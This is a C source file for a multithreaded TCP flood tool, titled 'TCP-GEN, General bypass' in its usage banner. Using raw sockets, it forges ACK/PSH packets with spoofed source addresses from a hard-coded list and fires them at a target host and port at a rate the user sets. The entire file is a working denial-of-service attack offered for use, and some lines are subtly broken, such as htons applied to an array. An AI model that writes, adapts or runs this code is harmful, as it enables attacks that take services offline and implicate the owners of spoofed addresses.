#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
 
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
 
void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

unsigned short csum (unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

int sourceports[]= {80,443,3306};
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;

    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *)buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16)
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t)(~sum));
}
 
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {
 
    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}
 
int randnum(int min_num, int max_num)
{
    int result = 0, low_num = 0, hi_num = 0;
 
    if (min_num < max_num)
    {
        low_num = min_num;
        hi_num = max_num + 1; 
    } else {
        low_num = max_num + 1; 
        hi_num = min_num;
    }
 

    result = (rand_cmwc() % (hi_num - low_num)) + low_num;
    return result;
} 
 
void setup_ip_header(struct iphdr *iph)
{
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(30000 + rand_cmwc() % 38323);
    iph->frag_off = 0;
    iph->ttl = 52; 
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
}
 
void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(sourceports); 
    tcph->seq = 0;
    tcph->ack_seq = 1;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->psh = 1;
    tcph->window = htons(64240);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}
 
void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);
 
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);
 
    tcph->dest = htons(floodport);
 
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
 
    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }
 
    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    
    int class[]= {3353864449,3353864453,3353864457,3353864461,3353864465,3353864469,3353864473,3353864477,3353864481,3353864485,3353864489,3353864493,3353864497,3353864501,3353864505,3353864509,3353864513,3353864517,3353864521,3353864525,3353864529,3353864533,3353864537,3353864541,3353864545,3353864549,3353864553,3353864557,3353864561,3353864565,3353864569,3353864573,3353864577,3353864581,3353864585,3353864589,3353864593,3353864597,3353864601,3353864605,3353864609,3353864613,3353864617,3353864621,3353864625,3353864629,3353864633,3353864637,3353864641,3353864645,3353864649,3353864653,3353864657,3353864661,3353864665,3353864669,3353864673,3353864677,3353864681,3353864685,3353864689,3353864693,3353864697,3353864701};
    
    while(1){
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
 
        iph->saddr = htonl(class[rand_cmwc()%64]); //64 is the count of decimals
        iph->id = htonl(30000 + rand_cmwc() % 38323); 
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        tcph->source = htons(sourceports);
        tcph->check = tcpcsum(iph, tcph);
        tcph->seq = 0;
        tcph->ack_seq = 1;
        tcph->res2 = 0;
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->psh = 1;
        tcph->window = htons(64240);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        if (floodport == 0)
        {
            tcph->dest = htons(rand_cmwc() % 0xFFFF);
        }
        else
        {
        tcph->dest = htons(floodport);
        }
        tcph->check = 0;
          tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof(struct tcphdr)), sizeof(struct tcphdr));
        
        pps++;
        if(i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}
int main(int argc, char *argv[ ])
{
    if(argc < 6){
        fprintf(stderr, "\e[1;33mTCP-GEN, General bypass.\n");
        fprintf(stdout, "\e[1;33mSyntax: %s <target> <port> <threads> <pps> <time>\n", argv[0]);
        exit(-1);
    }
 
    fprintf(stdout, "\e[1;31mSetting up Sockets...\n");
 
    int num_threads = atoi(argv[3]);
    floodport = atoi(argv[2]);
    int maxpps = atoi(argv[4]);
    limiter = 0;
    pps = 0;
    pthread_t thread[num_threads];
    
    int multiplier = 20;
 
    int i;
    for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
    }
    fprintf(stdout, "\e[1;33mStarting Bypass...\n");
    for(i = 0;i<(atoi(argv[5])*multiplier);i++)
    {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
            if(1 > limiter)
            {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25)
            {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }
 
    return 0;
}